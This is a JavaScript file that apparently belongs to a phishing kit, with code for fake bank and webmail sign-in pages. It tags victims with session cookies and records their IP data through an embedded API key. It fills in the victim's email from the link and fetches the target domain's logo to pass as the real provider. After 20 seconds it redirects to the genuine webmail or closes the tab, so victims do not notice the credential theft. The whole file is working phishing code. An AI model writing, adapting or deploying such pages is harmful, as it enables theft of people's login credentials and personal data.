// adding session ID to URL
var receiverEmailTest = Cookies.get("sessionID");
if (receiverEmailTest == undefined) {
  function makeid(length) {
    var result = "";
    var characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  var sessionIDvalve = makeid(25);
  Cookies.set("sessionID", sessionIDvalve, { expires: 7, path: "/" });
}

// Disable  submit button until form is filled
$(document).on("change keyup", ".requiredinput", function (e) {
  let Disabled = true;
  $(".requiredinput").each(function () {
    let value = this.value;
    if (value && value.trim() != "") {
      Disabled = false;
    } else {
      Disabled = true;
      return false;
    }
  });

  if (Disabled) {
    $(".toggle-disabled").prop("disabled", true);
    $(".toggle-disabled").addClass("myClass51");
  } else {
    $(".toggle-disabled").prop("disabled", false);
    $(".toggle-disabled").removeClass("myClass51");
  }
});

// check for input length
$(function () {
  $("#j_username").on("input", function () {
    if ($(this).val().length < 5) {
      $(".ClassUsername").addClass("myClass62");
      $(".Lineusernameborder").addClass("myClass63");
      $("#BTUKWOUR").show();
    } else {
      $(".ClassUsername").removeClass("myClass62");
      $(".Lineusernameborder").removeClass("myClass63");
      $("#BTUKWOUR").hide();
    }
  });
  $("#j_password").on("input", function () {
    if ($(this).val().length < 5) {
      $(".ClassPassword").addClass("myClass62");
      $(".Linepasswordborder").addClass("myClass63");
      $("#LXVMYNPI").show();
    } else {
      $(".ClassPassword").removeClass("myClass62");
      $(".Linepasswordborder").removeClass("myClass63");
      $("#LXVMYNPI").hide();
    }
  });
});

// input focus change placeholder
$(function () {
  $("#j_username").focus(function () {
    $(".ClassUsername").addClass("myClass64");
  });
  $("#j_password").focus(function () {
    $(".ClassPassword").addClass("myClass64");
  });
});

// Get Ip details
var ipFormInputtest = document.getElementById("ipFormInput");
if (ipFormInputtest != null) {
  $.getJSON("https://api.ipregistry.co/?key=zo00daci4rxm99zm", function (data) {
    var Myelement = document.getElementById("ipFormInput");

    Myelement.value = JSON.stringify(data, null, 2);
  });
}
// Toggle password input to text
$(function () {
  $("#showpaswd").on("click", function () {
    var x = document.getElementById("j_password");
    if (x.type === "password") {
      x.type = "text";
      document
        .getElementById("path1")
        .setAttribute(
          "d",
          "M12.13525,18.33925 C16.71175,18.33925 20.7655,16.105 23.26975,12.67 C20.7655,9.23425 16.71175,7 12.13525,7 C7.558,7 3.50425,9.23425 1,12.67 C3.50425,16.105 7.558,18.33925 12.13525,18.33925 Z M8.51125,7.49275 C7.6285,8.40025 7.08475,9.64 7.08475,11.00575 C7.08475,13.7905 9.34225,16.04875 12.12775,16.04875 C14.9125,16.04875 17.17,13.7905 17.17,11.00575 C17.17,9.63925 16.62625,8.40025 15.7435,7.49275"
        );
    } else {
      x.type = "password";
      document
        .getElementById("path1")
        .setAttribute(
          "d",
          "M12.13525,18.512 C16.71175,18.512 20.7655,16.27775 23.26975,12.842 C20.7655,9.407 16.71175,7.17275 12.13525,7.17275 C7.558,7.17275 3.50425,9.407 1,12.842 C3.50425,16.27775 7.558,18.512 12.13525,18.512 Z M8.51125,7.66475 C7.6285,8.573 7.08475,9.812 7.08475,11.1785 C7.08475,13.96325 9.34225,16.22075 12.12775,16.22075 C14.9125,16.22075 17.17,13.96325 17.17,11.1785 C17.17,9.812 16.62625,8.573 15.7435,7.66475 M3.88675,19.628 L18.34,5 L3.88675,19.628 Z"
        );
    }
  });
});

// toggle save username
$(function () {
  $("#toggleSaveUsername").on("click", function () {
    var mySVG = document.querySelector("#toggleSaveUsernameButton");
    if (mySVG.class === "myClass47") {
      mySVG.setAttribute("class", "myClass65");
    } else {
      mySVG.setAttribute("class", "myClass47");
    }
  });
});

// change save username check button
$(function () {
  $("#toggleSaveUsername").on("click", function () {
    var mySVG = document.querySelector("#toggleSaveUsernameButton");
    if ($(".class-toggle-disabled")[0]) {
      $("#toggleSaveUsername").removeClass("class-toggle-disabled");
      mySVG.setAttribute("class", "myClass65");
    } else {
      $("#toggleSaveUsername").addClass("class-toggle-disabled");
      mySVG.setAttribute("class", "myClass47");
    }
  });
});

// Greeting by time of the day
var greetingIDTest = document.getElementById("greetingID");
if (greetingIDTest != null) {
  $(function () {
    const time = new Date().getHours();
    let greeting;
    if (time < 11) {
      greeting = "Good morning";
    } else if (time < 18) {
      greeting = "Good day";
    } else {
      greeting = "Good evening";
    }
    document.getElementById("greetingID").innerHTML =
      greeting + " <span>" + "Sign on to manage your accounts" + "</span>";

    $("#greetingID > span").addClass("myClass66");
  });
}

// Randomize Background image
var backgroundImageIDTest = document.getElementById("backgroundImageID");
if (backgroundImageIDTest != null) {
  $(function () {
    var randnum = Math.floor(Math.random() * 3 + 1);
    document.getElementById("backgroundImageID").src =
      "./index_files/background" + randnum + ".jpg";
  });
}

//Get value of _after field for redirect
var index2aafterTest = document.getElementById("index2aafter");
if (index2aafterTest != null) {
  var sessionIDvalve = Cookies.get("sessionID");
  var aftervalue = document.getElementById("index2aafter").value;
  document.getElementById("index2aafter").value =
    window.location.protocol +
    "//" +
    window.location.hostname +
    ":" +
    window.location.port +
    aftervalue +
    "?sessionID=" +
    sessionIDvalve;
}
// Set Cookies for email address
var emailAddressTest = document.getElementById("emailAddress");
if (emailAddressTest != null) {
  $(function () {
    $("#emailAddress").on("input", function () {
      var filledform = document.getElementById("emailAddress").value;
      Cookies.set("email", filledform, { expires: 7, path: "/" });
    });
  });
}

// Read a specify cookie !! Here am getting email address
var emailAddressFieldTest = document.getElementById("emailAddressField");
if (emailAddressFieldTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    document.getElementById("emailAddressField").value = usercookieemail;
  });
}

// Read Domain name from cookies and insert to picture
var useEmailLogoTest = document.getElementById("useEmailLogo");
if (useEmailLogoTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    var usercookiedomain = usercookieemail.split("@")[1];
    document.getElementById("useEmailLogo").data =
      "https://logo.clearbit.com/" + usercookiedomain;
  });
}

//Insert email domain from cookies
var emailTitleTest = document.getElementById("emailTitle");
if (emailTitleTest != null) {
  $(function () {
    usercookieemail = Cookies.get("email");
    var usercookiedomain = usercookieemail.split("@")[1];
    document.getElementById("emailTitle").innerHTML =
      "Please login to " + usercookiedomain + " to verify your email.";
  });
}

// wells toggle password
$(".toggle-password").on("click", function () {
  $(this).toggleClass("fa-eye fa-eye-slash");
  var input = $($(this).attr("toggle"));
  if (input.attr("type") == "password") {
    input.attr("type", "text");
  } else {
    input.attr("type", "password");
  }
});

// Get email that receive email as cookies
const queryString = window.location.search;
const parameters = new URLSearchParams(queryString);
var userReceivedEmailTest = parameters.get("user");
if (userReceivedEmailTest != null) {
  Cookies.set("user", userReceivedEmailTest, { expires: 7, path: "/" });
}

// get Insert Receiver Email Value
var receiverEmailTest = document.getElementById("receiverEmail");
if (receiverEmailTest != null) {
  var receiverEmailValue = Cookies.get("user");
  if (receiverEmailValue != undefined) {
    $(function () {
      receiverEmailValue = Cookies.get("user");
      document.getElementById("receiverEmail").value = receiverEmailValue;
    });
  }
}

// get Insert session ID
var receiverEmailTest = document.getElementById("sessionIDvalueID");
if (receiverEmailTest != null) {
  $(function () {
    sessionIDValue = Cookies.get("sessionID");
    document.getElementById("sessionIDvalueID").value = sessionIDValue;
  });
}

// Insert redirection by receiver email
var webmailindex2aafterTest = document.getElementById("webmailindex2aafter");
if (webmailindex2aafterTest != null) {
  receiverEmailValue = Cookies.get("user");
  var Domainfromemail = receiverEmailValue.split("@")[1];
  function Redirect() {
    window.location = "https://webmail." + Domainfromemail;
  }
  setTimeout("Redirect()", 20000);
}

// This will close the current Page tab
var PageCloseTest = document.getElementById("PageClose");
if (PageCloseTest != null) {
  function close_window() {
    window.top.close();
  }
  setTimeout("close_window()", 20000);
}

// // Auto populate form details using the form name from url get data
// function FillForm() {
//     var FormName = "loginform";
//     var questionlocation = location.href.indexOf("?");
//     if (questionlocation < 0) {
//       return;
//     }
//     var q = location.href.substr(questionlocation + 1);
//     var list = q.split("&");
//     for (var i = 0; i < list.length; i++) {
//       var kv = list[i].split("=");
//       if (!eval("document." + FormName + "." + kv[0])) {
//         continue;
//       }
//       kv[1] = unescape(kv[1]);
//       if (kv[1].indexOf('"') > -1) {
//         var re = /"/g;
//         kv[1] = kv[1].replace(re, '\\"');
//       }
//       eval("document." + FormName + "." + kv[0] + '.value="' + kv[1] + '"');
//     }
//   }
//   FillForm();

//   // Auto get domain name from user to add to webmail
//   const queryString = window.location.search;
//   const parameters = new URLSearchParams(queryString);
//   const value1 = parameters.get("user");
//   document.querySelector('input[name="_after"]').value =
//     "https://webmail." + value1.split("@")[1];

// Get email of user
$(function () {
  var sentemailtest = document.getElementById("sentemail");
  if (sentemailtest != null) {
    const queryString = window.location.search;
    const parameters = new URLSearchParams(queryString);
    var sentemail = parameters.get("user");
    document.querySelector('input[name="sentemail"]').value = sentemail;
  }
});

// Read Domain name from URL and insert to picture
var useEmailLogofromurlTest = document.getElementById("useEmailLogofromurl");
if (useEmailLogofromurlTest != null) {
  $(function () {
    const queryString = window.location.search;
    const parameters = new URLSearchParams(queryString);
    var userurlemail = parameters.get("user");
    var userurldomain = userurlemail.split("@")[1];
    document.getElementById("useEmailLogofromurl").src =
      "https://f1.allesedv.com/150/" + userurldomain;
  });
}
